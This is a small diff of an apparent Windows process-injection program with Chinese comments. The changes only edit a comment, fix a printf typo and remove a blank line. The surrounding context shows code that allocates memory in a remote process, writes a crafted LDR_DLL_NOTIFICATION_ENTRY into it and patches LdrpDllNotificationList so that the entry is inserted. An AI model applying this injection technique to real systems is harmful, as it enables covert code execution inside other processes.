@@ -186,13 +186,13 @@ int main()
     // 设置新条目的 List.Flink 属性为指向list中原来第一个条目
     newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;
 
-    // 分配内存
+    // 分配内存空间
     LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);
 
     // 将新条目写入远程进程中
     WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
-    printf("[+] Net Entrty has been written to remote process: 0x%p\n", newEntryAddress);
+    printf("[+] New Entrty has been written to remote process: 0x%p\n", newEntryAddress);
 
     // 用新条目的地址计算我们需要覆写的地址
     // 上一个条目的 Flink（头）和下一个条目的 Blink
@@ -207,7 +207,6 @@ int main()
 
     printf("[+] LdrpDllNotificationList has been modified.\n");
     printf("[+] Our new entry has been inserted.\n");
-
 
     PrintDllNotificationList(hProc, remoteHeadAddress);
 }
